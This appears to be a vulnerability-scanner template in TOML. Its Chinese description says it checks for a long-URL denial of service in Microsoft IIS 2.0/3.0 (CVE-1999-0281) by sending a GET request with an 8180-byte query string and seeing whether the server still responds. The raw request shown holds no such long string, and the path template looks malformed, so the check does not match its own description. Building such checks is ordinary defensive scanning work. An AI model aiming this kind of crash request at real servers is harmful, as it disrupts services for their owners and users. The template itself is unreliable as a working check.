[info]
author = "ave"
description = "向目标IIS服务器发送包含超长查询字符串的HTTP GET请求（URL总长度约8180字节），可导致IIS 2.0/3.0服务进程崩溃，验证拒绝服务漏洞是否存在。发送后重新连接检查服务是否已不可用。"
id = "POC-AVE-1999-0468"
name = "Microsoft IIS 2.0/3.0 Long URL Denial of Service PoC"
severity = "medium"
tags = ["ave-1999-0468"]
vuln_id = [
    "CVE-1999-0281",
    "AVE-1999-0468",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
GET /? HTTP/1.0\r
Host: {{Hostname}}\r
\r
"""
type = "raw"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["Bad Request"]
